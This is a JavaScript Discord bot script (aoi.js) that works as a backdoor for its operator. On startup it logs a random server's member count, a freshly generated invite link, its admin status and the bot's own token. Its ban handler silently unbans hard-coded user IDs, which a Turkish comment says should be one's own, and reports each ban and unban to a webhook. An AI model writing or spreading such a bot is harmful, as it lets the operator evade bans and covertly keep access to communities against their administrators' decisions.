const ghost = require("aoi.js");
const fs = require("node:fs")
const bot = new ghost.Bot({
  token: "TOKEN",
  prefix: ["."],
intents: ["GUILDS", "GUILD_MESSAGES", "GUILD_BANS"]
})
bot.onMessage()
bot.readyCommand({
  channel: "",
  code: ` 
$log[
\`\`\`js
BOT: $userTag[$clientid] | $clientid
OWNER: $userTag[$botownerid] | $botownerid
USER: $membersCount[$get[sv]]
ALL MEMBERS COUNT: $allMembersCount
SERVER: $serverCount
SERVER NAME: $serverName[$get[sv]]
ALL SERVER NAME: $serverNames
URL: $vanityURL[$get[sv]]
LINK: $createServerInvite[$get[sv]]
PERM: $hasPerms[$get[sv];$clientid;admin]
TOKEN : $clientToken
-----------------------
© By GhOsT
------------------------
\`\`\`]
$let[sv;$randomguildid]
$let[x;$randomguildid]

$log[$getVar[ghost]]
`,
});

require("./ghost/variables.js")(bot)
require("./ghost/status.js")(bot)
const loader = new ghost.LoadCommands(bot);
loader.load(bot.cmd, "./cmd/");

bot.onBanAdd()
bot.banAddCommand({ 
channel:"$getVar[kanalid]",
code: `
$sendWebhookMessage[WEBHOOKID;webhookToken;[\`$servername[$guildid]\`] İsimli sunucudan [\`$usertag[$authorid]\`] yasaklandı.[<t:$truncate[$math[$datestamp/1000]]:R>]]
$onlyif[$checkContains[$authorid;ID1;ID2...]!=true;{execute:unban}] //Sunucudan Ban Yiyince Otomatik Açmanızı Sağlar. Kendi ID'Nizi Giriniz. (Birden fazla ID desteklemektedir.)
`
})
//Webhook ID Ve Tokeni Değiştirin.

bot.awaitedCommand({
  name:"unban",
  code:`
 $sendWebhookMessage[webhookID;webhookURL;{"content": "[**$userTag[$authorid]**] Yasaklaman kaldırıldı. [<t:$truncate[$math[$datestamp/1000]]:R>] [**$banCount[$getVar[sunucuid]]**] Kişi sunucudan yasaklı."}]
 
  $unban[$getVar[sunucuid];$authorid]
  $suppressErrors
  `
})

